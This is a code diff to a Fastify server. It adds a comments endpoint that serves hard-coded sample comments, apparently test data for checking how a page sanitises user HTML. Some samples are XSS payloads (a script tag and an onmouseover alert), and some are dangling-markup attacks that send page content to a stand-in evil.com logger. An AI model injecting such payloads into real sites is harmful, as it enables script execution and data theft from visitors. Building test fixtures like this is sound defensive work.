@@ -20,6 +20,8 @@ const server = fastify({
 server.register(compression);
 // serve dynamic images
 server.get("/qrCode.png", handleDynamicImages);
+// serve comment JSON
+server.get("/comments.json", getCommentData);
 // serve static files
 server.register(serveStatic,
 {
@@ -66,6 +68,7 @@ function addMimeTypes(res, path){
 
 function handleDynamicImages (req, reply) {
     reply.header('Vary', 'referer');
+    reply.header("Cross-Origin-Resource-Policy", "same-site");
     reply.type('image/png');
 
     const referrerGetParamaters = readGetParamaters(req.headers["referer"]);
@@ -111,6 +114,77 @@ function drawQrCode(reply, codeString) {
 
     const stream = image.pngStream();
     reply.send(stream);
+}
+
+function getCommentData(req, reply){
+    reply.header("Cross-Origin-Resource-Policy", "same-site");
+    reply.type('application/json');
+
+    const pageId = req.query["id"];
+
+    // TODO in an actual implemention, fetch this from a database
+    switch (pageId) {
+        case "1":
+            reply.send([
+{
+    author: "Some guy",
+    date: (new Date(2019, 7, 10, 9, 35)).getTime(),
+    text: "<p style='font-size:72px'>Wow, I'm a normal comment!</p>"
+},
+{
+    author: "Guy 2",
+    text: "<a href=\"https://google.com\">I have a link</a>" +
+            "<img src=\"https://www.google.com//images/branding/googlelogo/2x/googlelogo_color_272x92dp.png\" alt=\"And an image\">" +
+            "<svg height=\"210\" width=\"500\">" +
+                "<polygon points=\"100,10 40,198 190,78 10,78 160,198\" style=\"fill:lime;stroke:purple;stroke-width:5;fill-rule:nonzero;\"/>" +
+                "Sorry, your browser does not support inline SVG." +
+            "</svg>" +
+            "<math display=\"block\"><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>+</mo><mfrac><mn>1</mn>" +
+            "<mstyle displaystyle=\"true\" scriptlevel=\"0\"><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo>" +
+            "<mfrac><mn>1</mn><mstyle displaystyle=\"true\" scriptlevel=\"0\"><msub><mi>a</mi><mn>2</mn>" +
+            "</msub><mo>+</mo><mfrac><mn>1</mn><mstyle displaystyle=\"true\" scriptlevel=\"0\"><msub>" +
+            "<mi>a</mi><mn>3</mn></msub><mo>+</mo><mfrac><mn>1</mn><mstyle displaystyle=\"true\" scriptlevel=\"0\">" +
+            "<msub><mi>a</mi><mn>4</mn></msub></mstyle></mfrac></mstyle></mfrac></mstyle></mfrac></mstyle></mfrac></mrow></math>"
+},
+{
+    author: "Dead guy",
+    text: "<script>alert(1);<\/script>" +
+            "<p>I am l337 h4cker.</p>" +
+            "<p onmouseover=\"alert(1)\">See?</p>"
+},
+{
+    author: "Annoying person 34",
+    date: (new Date(2019, 7, 10, 10, 6)).getTime(),
+    text: "<p>I</p>" +
+            "<p>have</p>" +
+            "<p>a</p>" +
+            "<p>lot</p>" +
+            "<p>of</p>" +
+            "<p>things</p>" +
+            "<p>to</p>" +
+            "<p>say</p>" +
+            "<p>!</p>"
+},
+{
+    author: "Annoying person 35",
+    date: (new Date(2019, 7, 16, 9, 30)).getTime(),
+    text: "<p>Dangeling markup attack!</p>" +
+            "<base href='http://evil.com/'>" +
+            "<a href='/rel'>Relative link</a>" +
+            "<meta http-equiv='Refresh' content='0; url=http://example.com/'>" +
+            "<img src='http://evil.com/log.cgi?"
+},
+{
+    author: "Annoying person 36",
+    date: (new Date(2019, 7, 16, 9, 33)).getTime(),
+    text: "<p>Dangeling markup attack 2!</p>" +
+            "<form action='http://evil.com/log.cgi'><textarea>"
+}
+            ]);
+            break;
+        default:
+            reply.send([]);
+    }
 }
 
 function readGetParamaters(url) {
